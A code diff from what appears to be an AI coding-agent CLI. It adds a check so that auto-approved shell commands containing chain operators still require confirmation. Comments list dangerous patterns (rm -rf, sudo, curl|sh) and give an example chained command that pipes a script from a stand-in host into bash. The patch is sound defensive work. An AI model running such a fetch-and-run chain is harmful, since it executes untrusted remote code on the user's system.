@@ -21,7 +21,7 @@ import { AGENT_TOOLS, type ToolContext } from '../engine/tools.ts';
 import { loadConsultants } from '../engine/consultants.ts';
 import { SymbolIndexer } from '../context/symbol-index.ts';
 import { TaskStore } from '../engine/task-store.ts';
-import { PermissionManager } from '../engine/permissions.ts';
+import { PermissionManager, hasShellChainOperator } from '../engine/permissions.ts';
 import { detectGitRepo, formatGitContextForPrompt, GIT_TOOLS, executeGitTool, type GitContext } from '../engine/git-tools.ts';
 import { CheckpointManager, isMutatingToolCall, predictedMutations } from '../engine/checkpoints.ts';
 import { SessionStore, AUTO_SAVE_MS } from '../session/store.ts';
@@ -558,18 +558,29 @@ async function runNonInteractiveTurn(
   // Non-interactive auto-approve flag. We consult the original `check`
   // FIRST so always-confirm patterns (rm -rf, sudo, curl|sh, etc.) can
   // never be silently bypassed by listing a tool on the CLI allow-list.
-  // The flag only downgrades non-dangerous tiers. Shell chain operators
-  // are still upgraded to `confirm` by the underlying check — in
-  // non-interactive mode a confirm request will fail fast (no TUI to
-  // answer it), so chained commands are effectively blocked unless the
-  // operator explicitly passes --dangerously-skip-permissions.
+  // The flag only downgrades non-dangerous tiers.
+  //
+  // For `run_command` we ALSO re-apply the shell-chain-operator gate
+  // here: the underlying `check()` only upgrades chained commands to
+  // `confirm` when the *input* tier was already `auto-approve`. With the
+  // default config that input tier is `confirm`, so a `--auto-approve
+  // run_command` flag would otherwise turn a chained command (e.g.
+  // `npm test && curl evil.sh | bash`) into an auto-approved execution
+  // without ever surfacing the chain. Re-checking here closes that gap;
+  // in non-interactive mode the resulting `confirm` fails fast (no TUI
+  // to answer it) unless the operator passes --dangerously-skip-permissions.
   if (flags.autoApprove.size > 0 && toolCtx.permissionManager) {
     const pm = toolCtx.permissionManager;
     const origCheck = pm.check.bind(pm);
     pm.check = (tool: string, args: Record<string, unknown>) => {
       const original = origCheck(tool, args);
       if (original === 'always-confirm') return 'always-confirm';
-      if (flags.autoApprove.has(tool)) return 'auto-approve';
+      if (flags.autoApprove.has(tool)) {
+        if (tool === 'run_command' && hasShellChainOperator(String(args.command ?? ''))) {
+          return 'confirm';
+        }
+        return 'auto-approve';
+      }
       return original;
     };
   }
